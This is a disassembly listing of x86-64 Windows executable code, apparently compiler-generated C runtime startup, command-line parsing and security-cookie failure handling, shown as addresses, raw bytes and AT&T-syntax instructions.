   140008218:	48 ff 15 39 0f 00 00 	rex.W call *0xf39(%rip)        # 0x140009158
   14000821f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008224:	85 c0                	test   %eax,%eax
   140008226:	0f 85 ba 00 00 00    	jne    0x1400082e6
   14000822c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140008231:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140008236:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000823b:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140008240:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140008244:	45 33 c0             	xor    %r8d,%r8d
   140008247:	48 8d 15 12 15 00 00 	lea    0x1512(%rip),%rdx        # 0x140009760
   14000824e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008253:	48 ff 15 3e 0f 00 00 	rex.W call *0xf3e(%rip)        # 0x140009198
   14000825a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000825f:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140008264:	8b d8                	mov    %eax,%ebx
   140008266:	48 ff 15 3b 0f 00 00 	rex.W call *0xf3b(%rip)        # 0x1400091a8
   14000826d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008272:	85 db                	test   %ebx,%ebx
   140008274:	75 70                	jne    0x1400082e6
   140008276:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000827a:	8a 01                	mov    (%rcx),%al
   14000827c:	2c 30                	sub    $0x30,%al
   14000827e:	3c 09                	cmp    $0x9,%al
   140008280:	77 0d                	ja     0x14000828f
   140008282:	0f be 01             	movsbl (%rcx),%eax
   140008285:	83 c7 fd             	add    $0xfffffffd,%edi
   140008288:	c1 e7 04             	shl    $0x4,%edi
   14000828b:	03 f8                	add    %eax,%edi
   14000828d:	eb 26                	jmp    0x1400082b5
   14000828f:	8a 01                	mov    (%rcx),%al
   140008291:	2c 20                	sub    $0x20,%al
   140008293:	80 39 61             	cmpb   $0x61,(%rcx)
   140008296:	0f b6 d0             	movzbl %al,%edx
   140008299:	0f b6 01             	movzbl (%rcx),%eax
   14000829c:	0f 4c d0             	cmovl  %eax,%edx
   14000829f:	44 0f be c2          	movsbl %dl,%r8d
   1400082a3:	41 8d 40 bf          	lea    -0x41(%r8),%eax
   1400082a7:	83 f8 05             	cmp    $0x5,%eax
   1400082aa:	77 1a                	ja     0x1400082c6
   1400082ac:	c1 e7 04             	shl    $0x4,%edi
   1400082af:	83 c7 c9             	add    $0xffffffc9,%edi
   1400082b2:	41 03 f8             	add    %r8d,%edi
   1400082b5:	48 ff 15 8c 12 00 00 	rex.W call *0x128c(%rip)        # 0x140009548
   1400082bc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400082c1:	48 8b c8             	mov    %rax,%rcx
   1400082c4:	eb b4                	jmp    0x14000827a
   1400082c6:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400082ca:	48 3b c8             	cmp    %rax,%rcx
   1400082cd:	74 17                	je     0x1400082e6
   1400082cf:	81 e7 ff 03 00 00    	and    $0x3ff,%edi
   1400082d5:	3b fe                	cmp    %esi,%edi
   1400082d7:	74 05                	je     0x1400082de
   1400082d9:	83 ff 0d             	cmp    $0xd,%edi
   1400082dc:	75 08                	jne    0x1400082e6
   1400082de:	89 35 28 3f 00 00    	mov    %esi,0x3f28(%rip)        # 0x14000c20c
   1400082e4:	eb 06                	jmp    0x1400082ec
   1400082e6:	8b 35 20 3f 00 00    	mov    0x3f20(%rip),%esi        # 0x14000c20c
   1400082ec:	8b c6                	mov    %esi,%eax
   1400082ee:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   1400082f2:	48 33 cc             	xor    %rsp,%rcx
   1400082f5:	e8 f6 03 00 00       	call   0x1400086f0
   1400082fa:	4c 8d 9c 24 10 01 00 	lea    0x110(%rsp),%r11
   140008301:	00 
   140008302:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140008306:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000830a:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   14000830e:	49 8b e3             	mov    %r11,%rsp
   140008311:	5d                   	pop    %rbp
   140008312:	c3                   	ret
   140008313:	cc                   	int3
   140008314:	cc                   	int3
   140008315:	cc                   	int3
   140008316:	cc                   	int3
   140008317:	cc                   	int3
   140008318:	71 30                	jno    0x14000834a
   14000831a:	52                   	push   %rdx
   14000831b:	5e                   	pop    %rsi
   14000831c:	47 27                	rex.RXB (bad)
   14000831e:	05 d3 48 83 ec       	add    $0xec8348d3,%eax
   140008323:	28 b8 4d 5a 00 00    	sub    %bh,0x5a4d(%rax)
   140008329:	66 39 05 d0 7c ff ff 	cmp    %ax,-0x8330(%rip)        # 0x140000000
   140008330:	74 04                	je     0x140008336
   140008332:	33 c0                	xor    %eax,%eax
   140008334:	eb 53                	jmp    0x140008389
   140008336:	48 63 0d ff 7c ff ff 	movslq -0x8301(%rip),%rcx        # 0x14000003c
   14000833d:	48 8d 05 bc 7c ff ff 	lea    -0x8344(%rip),%rax        # 0x140000000
   140008344:	48 03 c8             	add    %rax,%rcx
   140008347:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000834d:	75 e3                	jne    0x140008332
   14000834f:	b8 0b 01 00 00       	mov    $0x10b,%eax
   140008354:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140008358:	74 1e                	je     0x140008378
   14000835a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000835f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140008363:	75 cd                	jne    0x140008332
   140008365:	33 c0                	xor    %eax,%eax
   140008367:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   14000836e:	76 19                	jbe    0x140008389
   140008370:	39 81 f8 00 00 00    	cmp    %eax,0xf8(%rcx)
   140008376:	eb 0e                	jmp    0x140008386
   140008378:	33 c0                	xor    %eax,%eax
   14000837a:	83 79 74 0e          	cmpl   $0xe,0x74(%rcx)
   14000837e:	76 09                	jbe    0x140008389
   140008380:	39 81 e8 00 00 00    	cmp    %eax,0xe8(%rcx)
   140008386:	0f 95 c0             	setne  %al
   140008389:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000838e:	89 05 ac 3e 00 00    	mov    %eax,0x3eac(%rip)        # 0x14000c240
   140008394:	e8 0f 07 00 00       	call   0x140008aa8
   140008399:	8b c8                	mov    %eax,%ecx
   14000839b:	ff 15 7f 12 00 00    	call   *0x127f(%rip)        # 0x140009620
   1400083a1:	48 8b 0d 30 12 00 00 	mov    0x1230(%rip),%rcx        # 0x1400095d8
   1400083a8:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400083ac:	48 89 05 b5 47 00 00 	mov    %rax,0x47b5(%rip)        # 0x14000cb68
   1400083b3:	48 89 05 b6 47 00 00 	mov    %rax,0x47b6(%rip)        # 0x14000cb70
   1400083ba:	8b 05 0c 44 00 00    	mov    0x440c(%rip),%eax        # 0x14000c7cc
   1400083c0:	89 01                	mov    %eax,(%rcx)
   1400083c2:	48 8b 0d 07 12 00 00 	mov    0x1207(%rip),%rcx        # 0x1400095d0
   1400083c9:	8b 05 f1 43 00 00    	mov    0x43f1(%rip),%eax        # 0x14000c7c0
   1400083cf:	89 01                	mov    %eax,(%rcx)
   1400083d1:	e8 2a 07 00 00       	call   0x140008b00
   1400083d6:	83 3d 23 3c 00 00 00 	cmpl   $0x0,0x3c23(%rip)        # 0x14000c000
   1400083dd:	75 0d                	jne    0x1400083ec
   1400083df:	48 8d 0d ea 08 00 00 	lea    0x8ea(%rip),%rcx        # 0x140008cd0
   1400083e6:	ff 15 0c 12 00 00    	call   *0x120c(%rip)        # 0x1400095f8
   1400083ec:	33 c0                	xor    %eax,%eax
   1400083ee:	48 83 c4 28          	add    $0x28,%rsp
   1400083f2:	c3                   	ret
   1400083f3:	cc                   	int3
   1400083f4:	cc                   	int3
   1400083f5:	cc                   	int3
   1400083f6:	cc                   	int3
   1400083f7:	cc                   	int3
   1400083f8:	71 48                	jno    0x140008442
   1400083fa:	da 56 96             	ficoml -0x6a(%rsi)
   1400083fd:	3e f1                	ds int1
   1400083ff:	85 48 83             	test   %ecx,-0x7d(%rax)
   140008402:	ec                   	in     (%dx),%al
   140008403:	38 8b 05 be 43 00    	cmp    %cl,0x43be05(%rbx)
   140008409:	00 4c 8d 05          	add    %cl,0x5(%rbp,%rcx,4)
   14000840d:	27                   	(bad)
   14000840e:	3e 00 00             	ds add %al,(%rax)
   140008411:	44 8b 0d ac 43 00 00 	mov    0x43ac(%rip),%r9d        # 0x14000c7c4
   140008418:	48 8d 15 11 3e 00 00 	lea    0x3e11(%rip),%rdx        # 0x14000c230
   14000841f:	89 05 1f 3e 00 00    	mov    %eax,0x3e1f(%rip)        # 0x14000c244
   140008425:	48 8d 0d fc 3d 00 00 	lea    0x3dfc(%rip),%rcx        # 0x14000c228
   14000842c:	48 8d 05 11 3e 00 00 	lea    0x3e11(%rip),%rax        # 0x14000c244
   140008433:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008438:	ff 15 ea 11 00 00    	call   *0x11ea(%rip)        # 0x140009628
   14000843e:	89 05 e8 3d 00 00    	mov    %eax,0x3de8(%rip)        # 0x14000c22c
   140008444:	48 83 c4 38          	add    $0x38,%rsp
   140008448:	c3                   	ret
   140008449:	cc                   	int3
   14000844a:	cc                   	int3
   14000844b:	cc                   	int3
   14000844c:	cc                   	int3
   14000844d:	cc                   	int3
   14000844e:	cc                   	int3
   14000844f:	cc                   	int3
   140008450:	cc                   	int3
   140008451:	cc                   	int3
   140008452:	cc                   	int3
   140008453:	cc                   	int3
   140008454:	cc                   	int3
   140008455:	cc                   	int3
   140008456:	cc                   	int3
   140008457:	cc                   	int3
   140008458:	71 30                	jno    0x14000848a
   14000845a:	52                   	push   %rdx
   14000845b:	5e                   	pop    %rsi
   14000845c:	47 27                	rex.RXB (bad)
   14000845e:	05 d3 48 83 ec       	add    $0xec8348d3,%eax
   140008463:	28 e8                	sub    %ch,%al
   140008465:	8b 07                	mov    (%rdi),%eax
   140008467:	00 00                	add    %al,(%rax)
   140008469:	48 83 c4 28          	add    $0x28,%rsp
   14000846d:	e9 06 00 00 00       	jmp    0x140008478
   140008472:	cc                   	int3
   140008473:	cc                   	int3
   140008474:	cc                   	int3
   140008475:	cc                   	int3
   140008476:	cc                   	int3
   140008477:	cc                   	int3
   140008478:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000847d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140008482:	41 56                	push   %r14
   140008484:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000848b:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140008490:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008495:	ff 15 8d 0f 00 00    	call   *0xf8d(%rip)        # 0x140009428
   14000849b:	90                   	nop
   14000849c:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400084a3:	00 00 
   1400084a5:	48 8b 58 08          	mov    0x8(%rax),%rbx
   1400084a9:	33 ff                	xor    %edi,%edi
   1400084ab:	33 c0                	xor    %eax,%eax
   1400084ad:	f0 48 0f b1 1d c2 46 	lock cmpxchg %rbx,0x46c2(%rip)        # 0x14000cb78
   1400084b4:	00 00 
   1400084b6:	74 0a                	je     0x1400084c2
   1400084b8:	48 3b c3             	cmp    %rbx,%rax
   1400084bb:	75 1d                	jne    0x1400084da
   1400084bd:	bf 01 00 00 00       	mov    $0x1,%edi
   1400084c2:	8b 05 b8 46 00 00    	mov    0x46b8(%rip),%eax        # 0x14000cb80
   1400084c8:	83 f8 01             	cmp    $0x1,%eax
   1400084cb:	75 1a                	jne    0x1400084e7
   1400084cd:	8d 48 1e             	lea    0x1e(%rax),%ecx
   1400084d0:	e8 1e 06 00 00       	call   0x140008af3
   1400084d5:	e9 84 00 00 00       	jmp    0x14000855e
   1400084da:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400084df:	ff 15 3b 0f 00 00    	call   *0xf3b(%rip)        # 0x140009420
   1400084e5:	eb c4                	jmp    0x1400084ab
   1400084e7:	8b 05 93 46 00 00    	mov    0x4693(%rip),%eax        # 0x14000cb80
   1400084ed:	85 c0                	test   %eax,%eax
   1400084ef:	75 63                	jne    0x140008554
   1400084f1:	c7 05 85 46 00 00 01 	movl   $0x1,0x4685(%rip)        # 0x14000cb80
   1400084f8:	00 00 00 
   1400084fb:	4c 8d 35 be 11 00 00 	lea    0x11be(%rip),%r14        # 0x1400096c0
   140008502:	48 8d 1d 9f 11 00 00 	lea    0x119f(%rip),%rbx        # 0x1400096a8
   140008509:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000850e:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140008512:	49 3b de             	cmp    %r14,%rbx
   140008515:	73 2f                	jae    0x140008546
   140008517:	85 c0                	test   %eax,%eax
   140008519:	75 2f                	jne    0x14000854a
   14000851b:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   14000851f:	74 1a                	je     0x14000853b
   140008521:	49 ba 70 30 52 5e 47 	movabs $0xd30527475e523070,%r10
   140008528:	27 05 d3 
   14000852b:	48 8b 03             	mov    (%rbx),%rax
   14000852e:	48 8b 0d 4b 11 00 00 	mov    0x114b(%rip),%rcx        # 0x140009680
   140008535:	ff d1                	call   *%rcx
   140008537:	89 44 24 24          	mov    %eax,0x24(%rsp)
   14000853b:	48 83 c3 08          	add    $0x8,%rbx
   14000853f:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140008544:	eb cc                	jmp    0x140008512
   140008546:	85 c0                	test   %eax,%eax
   140008548:	74 14                	je     0x14000855e
   14000854a:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000854f:	e9 67 01 00 00       	jmp    0x1400086bb
   140008554:	c7 05 c6 3c 00 00 01 	movl   $0x1,0x3cc6(%rip)        # 0x14000c224
   14000855b:	00 00 00 
   14000855e:	8b 05 1c 46 00 00    	mov    0x461c(%rip),%eax        # 0x14000cb80
   140008564:	83 f8 01             	cmp    $0x1,%eax
   140008567:	75 1d                	jne    0x140008586
   140008569:	48 8d 15 30 11 00 00 	lea    0x1130(%rip),%rdx        # 0x1400096a0
   140008570:	48 8d 0d 19 11 00 00 	lea    0x1119(%rip),%rcx        # 0x140009690
   140008577:	e8 5d 07 00 00       	call   0x140008cd9
   14000857c:	c7 05 fa 45 00 00 02 	movl   $0x2,0x45fa(%rip)        # 0x14000cb80
   140008583:	00 00 00 
   140008586:	85 ff                	test   %edi,%edi
   140008588:	75 09                	jne    0x140008593
   14000858a:	33 c0                	xor    %eax,%eax
   14000858c:	48 87 05 e5 45 00 00 	xchg   %rax,0x45e5(%rip)        # 0x14000cb78
   140008593:	48 83 3d ed 45 00 00 	cmpq   $0x0,0x45ed(%rip)        # 0x14000cb88
   14000859a:	00 
   14000859b:	74 34                	je     0x1400085d1
   14000859d:	48 8d 0d e4 45 00 00 	lea    0x45e4(%rip),%rcx        # 0x14000cb88
   1400085a4:	e8 b7 05 00 00       	call   0x140008b60
   1400085a9:	85 c0                	test   %eax,%eax
   1400085ab:	74 24                	je     0x1400085d1
   1400085ad:	49 ba 70 28 d9 78 45 	movabs $0x99012e4578d92870,%r10
   1400085b4:	2e 01 99 
   1400085b7:	45 33 c0             	xor    %r8d,%r8d
   1400085ba:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400085be:	33 c9                	xor    %ecx,%ecx
   1400085c0:	48 8b 05 c1 45 00 00 	mov    0x45c1(%rip),%rax        # 0x14000cb88
   1400085c7:	4c 8b 0d b2 10 00 00 	mov    0x10b2(%rip),%r9        # 0x140009680
   1400085ce:	41 ff d1             	call   *%r9
   1400085d1:	48 8b 05 08 10 00 00 	mov    0x1008(%rip),%rax        # 0x1400095e0
   1400085d8:	48 8b 18             	mov    (%rax),%rbx
   1400085db:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400085e0:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   1400085e4:	0f b6 0b             	movzbl (%rbx),%ecx
   1400085e7:	80 f9 20             	cmp    $0x20,%cl
   1400085ea:	77 71                	ja     0x14000865d
   1400085ec:	84 c9                	test   %cl,%cl
   1400085ee:	74 04                	je     0x1400085f4
   1400085f0:	85 ff                	test   %edi,%edi
   1400085f2:	75 69                	jne    0x14000865d
   1400085f4:	fe c9                	dec    %cl
   1400085f6:	80 f9 1f             	cmp    $0x1f,%cl
   1400085f9:	77 0c                	ja     0x140008607
   1400085fb:	48 ff c3             	inc    %rbx
   1400085fe:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140008603:	8a 0b                	mov    (%rbx),%cl
   140008605:	eb ed                	jmp    0x1400085f4
   140008607:	f6 44 24 7c 01       	testb  $0x1,0x7c(%rsp)
   14000860c:	0f b7 84 24 80 00 00 	movzwl 0x80(%rsp),%eax
   140008613:	00 
   140008614:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   14000861a:	44 0f 45 c8          	cmovne %eax,%r9d
   14000861e:	4c 8b c3             	mov    %rbx,%r8
   140008621:	33 d2                	xor    %edx,%edx
   140008623:	48 8d 0d d6 79 ff ff 	lea    -0x862a(%rip),%rcx        # 0x140000000
   14000862a:	e8 41 a7 ff ff       	call   0x140002d70
   14000862f:	89 05 eb 3b 00 00    	mov    %eax,0x3beb(%rip)        # 0x14000c220
   140008635:	83 3d 04 3c 00 00 00 	cmpl   $0x0,0x3c04(%rip)        # 0x14000c240
   14000863c:	75 08                	jne    0x140008646
   14000863e:	8b c8                	mov    %eax,%ecx
   140008640:	ff 15 d2 0f 00 00    	call   *0xfd2(%rip)        # 0x140009618
   140008646:	83 3d d7 3b 00 00 00 	cmpl   $0x0,0x3bd7(%rip)        # 0x14000c224
   14000864d:	75 0c                	jne    0x14000865b
   14000864f:	ff 15 b3 0f 00 00    	call   *0xfb3(%rip)        # 0x140009608
   140008655:	8b 05 c5 3b 00 00    	mov    0x3bc5(%rip),%eax        # 0x14000c220
   14000865b:	eb 5e                	jmp    0x1400086bb
   14000865d:	80 f9 22             	cmp    $0x22,%cl
   140008660:	75 0d                	jne    0x14000866f
   140008662:	33 c0                	xor    %eax,%eax
   140008664:	85 ff                	test   %edi,%edi
   140008666:	0f 94 c0             	sete   %al
   140008669:	8b f8                	mov    %eax,%edi
   14000866b:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000866f:	ff 15 8b 0f 00 00    	call   *0xf8b(%rip)        # 0x140009600
   140008675:	85 c0                	test   %eax,%eax
   140008677:	74 08                	je     0x140008681
   140008679:	48 ff c3             	inc    %rbx
   14000867c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140008681:	48 ff c3             	inc    %rbx
   140008684:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140008689:	e9 56 ff ff ff       	jmp    0x1400085e4
   14000868e:	89 05 8c 3b 00 00    	mov    %eax,0x3b8c(%rip)        # 0x14000c220
   140008694:	83 3d a5 3b 00 00 00 	cmpl   $0x0,0x3ba5(%rip)        # 0x14000c240
   14000869b:	75 09                	jne    0x1400086a6
   14000869d:	8b c8                	mov    %eax,%ecx
   14000869f:	ff 15 6b 0f 00 00    	call   *0xf6b(%rip)        # 0x140009610
   1400086a5:	cc                   	int3
   1400086a6:	83 3d 77 3b 00 00 00 	cmpl   $0x0,0x3b77(%rip)        # 0x14000c224
   1400086ad:	75 0c                	jne    0x1400086bb
   1400086af:	ff 15 53 0f 00 00    	call   *0xf53(%rip)        # 0x140009608
   1400086b5:	8b 05 65 3b 00 00    	mov    0x3b65(%rip),%eax        # 0x14000c220
   1400086bb:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   1400086c2:	00 
   1400086c3:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400086c7:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   1400086cb:	49 8b e3             	mov    %r11,%rsp
   1400086ce:	41 5e                	pop    %r14
   1400086d0:	c3                   	ret
   1400086d1:	cc                   	int3
   1400086d2:	cc                   	int3
   1400086d3:	cc                   	int3
   1400086d4:	cc                   	int3
   1400086d5:	cc                   	int3
   1400086d6:	cc                   	int3
   1400086d7:	cc                   	int3
   1400086d8:	cc                   	int3
   1400086d9:	cc                   	int3
   1400086da:	cc                   	int3
   1400086db:	cc                   	int3
   1400086dc:	cc                   	int3
   1400086dd:	cc                   	int3
   1400086de:	cc                   	int3
   1400086df:	cc                   	int3
   1400086e0:	cc                   	int3
   1400086e1:	cc                   	int3
   1400086e2:	cc                   	int3
   1400086e3:	cc                   	int3
   1400086e4:	cc                   	int3
   1400086e5:	cc                   	int3
   1400086e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400086ed:	00 00 00 
   1400086f0:	48 3b 0d 11 39 00 00 	cmp    0x3911(%rip),%rcx        # 0x14000c008
   1400086f7:	75 10                	jne    0x140008709
   1400086f9:	48 c1 c1 10          	rol    $0x10,%rcx
   1400086fd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140008702:	75 01                	jne    0x140008705
   140008704:	c3                   	ret
   140008705:	48 c1 c9 10          	ror    $0x10,%rcx
   140008709:	e9 42 00 00 00       	jmp    0x140008750
   14000870e:	cc                   	int3
   14000870f:	cc                   	int3
   140008710:	cc                   	int3
   140008711:	cc                   	int3
   140008712:	cc                   	int3
   140008713:	cc                   	int3
   140008714:	40 53                	rex push %rbx
   140008716:	48 83 ec 20          	sub    $0x20,%rsp
   14000871a:	48 8b d9             	mov    %rcx,%rbx
   14000871d:	33 c9                	xor    %ecx,%ecx
   14000871f:	ff 15 2b 0d 00 00    	call   *0xd2b(%rip)        # 0x140009450
   140008725:	48 8b cb             	mov    %rbx,%rcx
   140008728:	ff 15 1a 0d 00 00    	call   *0xd1a(%rip)        # 0x140009448
   14000872e:	ff 15 cc 0c 00 00    	call   *0xccc(%rip)        # 0x140009400
   140008734:	48 8b c8             	mov    %rax,%rcx
   140008737:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   14000873c:	48 83 c4 20          	add    $0x20,%rsp
   140008740:	5b                   	pop    %rbx
   140008741:	48 ff 25 10 0d 00 00 	rex.W jmp *0xd10(%rip)        # 0x140009458
   140008748:	71 ca                	jno    0x140008714
   14000874a:	da 1a                	ficompl (%rdx)
   14000874c:	b6 17                	mov    $0x17,%dh
   14000874e:	b8 99 48 89 4c       	mov    $0x4c894899,%eax
   140008753:	24 08                	and    $0x8,%al
   140008755:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000875c:	48 8d 0d 8d 3b 00 00 	lea    0x3b8d(%rip),%rcx        # 0x14000c2f0
   140008763:	ff 15 c7 0c 00 00    	call   *0xcc7(%rip)        # 0x140009430
   140008769:	48 8b 05 78 3c 00 00 	mov    0x3c78(%rip),%rax        # 0x14000c3e8
   140008770:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140008775:	45 33 c0             	xor    %r8d,%r8d
   140008778:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000877d:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140008782:	ff 15 b0 0c 00 00    	call   *0xcb0(%rip)        # 0x140009438
   140008788:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000878d:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   140008793:	74 42                	je     0x1400087d7
   140008795:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000879c:	00 00 
   14000879e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400087a3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400087a8:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400087ad:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400087b2:	48 8d 05 37 3b 00 00 	lea    0x3b37(%rip),%rax        # 0x14000c2f0
   1400087b9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400087be:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400087c3:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   1400087c8:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   1400087cd:	33 c9                	xor    %ecx,%ecx
   1400087cf:	ff 15 6b 0c 00 00    	call   *0xc6b(%rip)        # 0x140009440
   1400087d5:	eb 23                	jmp    0x1400087fa
   1400087d7:	48 8b 05 aa 3b 00 00 	mov    0x3baa(%rip),%rax        # 0x14000c388
   1400087de:	48 8b 00             	mov    (%rax),%rax
   1400087e1:	48 89 05 00 3c 00 00 	mov    %rax,0x3c00(%rip)        # 0x14000c3e8
   1400087e8:	48 8b 05 99 3b 00 00 	mov    0x3b99(%rip),%rax        # 0x14000c388
   1400087ef:	48 83 c0 08          	add    $0x8,%rax
   1400087f3:	48 89 05 8e 3b 00 00 	mov    %rax,0x3b8e(%rip)        # 0x14000c388
   1400087fa:	48 8b 05 e7 3b 00 00 	mov    0x3be7(%rip),%rax        # 0x14000c3e8
   140008801:	48 89 05 58 3a 00 00 	mov    %rax,0x3a58(%rip)        # 0x14000c260
   140008808:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000880f:	00 
   140008810:	48 89 05 59 3b 00 00 	mov    %rax,0x3b59(%rip)        # 0x14000c370
   140008817:	c7 05 2f 3a 00 00 09 	movl   $0xc0000409,0x3a2f(%rip)        # 0x14000c250
   14000881e:	04 00 c0 
   140008821:	c7 05 29 3a 00 00 01 	movl   $0x1,0x3a29(%rip)        # 0x14000c254
   140008828:	00 00 00 
   14000882b:	c7 05 33 3a 00 00 03 	movl   $0x3,0x3a33(%rip)        # 0x14000c268
   140008832:	00 00 00 
   140008835:	b8 08 00 00 00       	mov    $0x8,%eax
   14000883a:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000883e:	48 8d 0d 2b 3a 00 00 	lea    0x3a2b(%rip),%rcx        # 0x14000c270
   140008845:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000884c:	00 
   14000884d:	b8 08 00 00 00       	mov    $0x8,%eax
   140008852:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140008856:	48 8d 0d 13 3a 00 00 	lea    0x3a13(%rip),%rcx        # 0x14000c270
   14000885d:	48 8b 15 a4 37 00 00 	mov    0x37a4(%rip),%rdx        # 0x14000c008
   140008864:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   140008868:	b8 08 00 00 00       	mov    $0x8,%eax
   14000886d:	48 6b c0 02          	imul   $0x2,%rax,%rax
   140008871:	48 8d 0d f8 39 00 00 	lea    0x39f8(%rip),%rcx        # 0x14000c270
   140008878:	48 8b 15 91 37 00 00 	mov    0x3791(%rip),%rdx        # 0x14000c010
   14000887f:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   140008883:	b8 08 00 00 00       	mov    $0x8,%eax
   140008888:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000888c:	48 8b 0d 75 37 00 00 	mov    0x3775(%rip),%rcx        # 0x14000c008
   140008893:	48 89 4c 04 68       	mov    %rcx,0x68(%rsp,%rax,1)
   140008898:	b8 08 00 00 00       	mov    $0x8,%eax
   14000889d:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400088a1:	48 8b 0d 68 37 00 00 	mov    0x3768(%rip),%rcx        # 0x14000c010
   1400088a8:	48 89 4c 04 68       	mov    %rcx,0x68(%rsp,%rax,1)
   1400088ad:	48 8d 0d 4c 07 00 00 	lea    0x74c(%rip),%rcx        # 0x140009000
   1400088b4:	e8 5b fe ff ff       	call   0x140008714
   1400088b9:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400088c0:	c3                   	ret
   1400088c1:	cc                   	int3
   1400088c2:	cc                   	int3
   1400088c3:	cc                   	int3
   1400088c4:	cc                   	int3
   1400088c5:	cc                   	int3
   1400088c6:	cc                   	int3
   1400088c7:	cc                   	int3
   1400088c8:	48 83 ec 78          	sub    $0x78,%rsp
   1400088cc:	48 8d 0d 1d 3a 00 00 	lea    0x3a1d(%rip),%rcx        # 0x14000c2f0
   1400088d3:	ff 15 57 0b 00 00    	call   *0xb57(%rip)        # 0x140009430
   1400088d9:	48 8b 05 08 3b 00 00 	mov    0x3b08(%rip),%rax        # 0x14000c3e8
   1400088e0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400088e5:	45 33 c0             	xor    %r8d,%r8d
   1400088e8:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400088ed:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400088f2:	ff 15 40 0b 00 00    	call   *0xb40(%rip)        # 0x140009438
   1400088f8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400088fd:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   140008903:	74 42                	je     0x140008947
   140008905:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000890c:	00 00 
   14000890e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140008913:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008918:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000891d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008922:	48 8d 05 c7 39 00 00 	lea    0x39c7(%rip),%rax        # 0x14000c2f0
   140008929:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000892e:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140008933:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
